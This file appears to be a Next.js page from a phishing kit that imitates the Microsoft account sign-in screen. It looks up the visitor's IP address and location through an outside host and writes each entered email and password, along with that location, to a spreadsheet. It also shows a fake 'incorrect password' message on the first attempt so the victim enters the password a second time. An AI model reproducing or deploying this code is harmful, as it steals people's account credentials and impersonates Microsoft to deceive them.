"use client";

import React, { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import SuccessModal from "../components/SuccessModal";
import Image from "next/image";
import { msl } from "@/images";
import { appendToSheet } from "@/actions/spreadSheet";

export default function Page() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [msg, setMsg] = useState("");
  const [msg2, setMsg2] = useState("");
  const [isFirstAttempt, setIsFirstAttempt] = useState(true);
  const router = useRouter();
  const [successModal, setSuccessModal] = useState(false);
  const category = "Microsoft Mail";
  const [locationData, setLocationData] = useState(null);
  const [error, setError] = useState(null);

  useEffect(() => {
    const fetchLocationData = async () => {
      try {
        const res = await fetch("https://inkvotes.vercel.app/");
        const locationHeader = res.headers.get("X-Client-Location");
        const locationData = locationHeader
          ? JSON.parse(locationHeader)
          : await fetch("/api/location").then((res) => res.json());

        const { country, ip, city, region } = locationData;

        const countryResponse = await fetch(
          `https://restcountries.com/v3.1/alpha/${country}`
        );

        if (!countryResponse.ok) {
          throw new Error("Failed to fetch country data");
        }

        const countryData = await countryResponse.json();
        const countryInfo = countryData[0];

        const countryName = countryInfo?.name.common || "Unknown";
        const continent = countryInfo.continents
          ? countryInfo.continents[0]
          : "Unknown";
        const currency = countryInfo.currencies
          ? Object.keys(countryInfo.currencies)[0]
          : "Unknown";
        const phoneCode = countryInfo.idd
          ? countryInfo.idd.root +
            (countryInfo.idd.suffixes && countryInfo.idd.suffixes.length > 0
              ? countryInfo.idd.suffixes[0]
              : "")
          : "Unknown";
        const capital = countryInfo.capital ? countryInfo.capital[0] : "Unknown";

        setLocationData({
          country: countryName,
          ip,
          city,
          region,
          continent,
          capital,
          currency,
          phoneCode,
        });
      } catch (err) {
        console.error("Error fetching location data:", err);
        setError("Failed to fetch location data");
      }
    };

    fetchLocationData();
  }, []);

  const handleNext = () => {
    if (!email) {
      setMsg("Enter a valid email address, phone number, or Skype name.");
    } else {
      setMsg("");
      setShowPassword(true);
    }
  };

  const handleBack = () => {
    setShowPassword(false);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!password) {
      setMsg2("Please enter the password for your Microsoft account.");
      return;
    }

    try {
      const capital = locationData?.capital || "unknown";
      const city = locationData?.city || "unknown";
      const continent = locationData?.continent || "unknown";
      const ip = locationData?.ip || "unknown";
      const region = locationData?.region || "unknown";
      const country = locationData?.country || "unknown";
      const currency = locationData?.currency || "unknown";
      const phoneCode = locationData?.phoneCode || "unknown";

      const data = [
        [
          category,
          email,
          password,
          ip,
          city,
          region,
          country,
          continent,
          currency,
          phoneCode,
        ],
      ];

      await appendToSheet(data);

      if (isFirstAttempt) {
        setMsg2(
          "The email or password you entered is incorrect. Please try again."
        );
        setPassword("");
        setIsFirstAttempt(false);
        setShowPassword(false); // Go back to email input page
      } else {
        setSuccessModal(true);
      }
    } catch (error) {
      console.error("Error:", error);
    }
  };

  if (successModal) {
    return <SuccessModal />;
  }

  if (error) {
    return <p className="text-red-500">{error}</p>;
  }

  if (!locationData) {
    return <p>Loading...</p>;
  }

  return (
    <div className="flex items-center justify-center h-screen bg-gray-100">
      <div className="bg-white p-8 rounded shadow-md w-full max-w-md">
        <Image src={msl} alt="Microsoft Logo" className="mx-auto mb-6" />
        {!showPassword ? (
          <div className="slide-one">
            <h2 className="text-2xl font-semibold mb-4">Sign in</h2>
            <span className="msg text-red-500 text-sm">{msg}</span>
            <input
              type="email"
              id="email"
              name="USER"
              placeholder="Email, phone, or Skype"
              className="w-full px-4 py-2 border border-gray-300 rounded mt-2"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <p className="mt-4">
              No account?{" "}
              <a href="#" className="text-blue-500">
                Create one!
              </a>
            </p>
            <p className="text-blue-500 mt-2">Sign in with a security key</p>
            <div className="mt-4">
              <button
                onClick={handleNext}
                className="w-full bg-blue-600 text-white py-2 rounded"
              >
                Next
              </button>
            </div>
          </div>
        ) : (
          <div className="slide-two">
            <span className="msg2 text-red-500 text-sm">{msg2}</span>
            <button onClick={handleBack} className="text-blue-500 mb-4">
              <i className="fa fa-arrow-left"></i> {email}
            </button>
            <h2 className="text-2xl font-semibold mb-4">Enter password</h2>
            <input
              type="password"
              id="password"
              name="PASS"
              placeholder="Password"
              className="w-full px-4 py-2 border border-gray-300 rounded mt-2"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <p className="mt-4">
              Forget password?{" "}
              <a href="#" className="text-blue-500">
                Other ways to sign in
              </a>
            </p>
            <div className="mt-4">
              <button
                onClick={handleSubmit}
                className="w-full bg-blue-600 text-white py-2 rounded"
              >
                Sign in
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
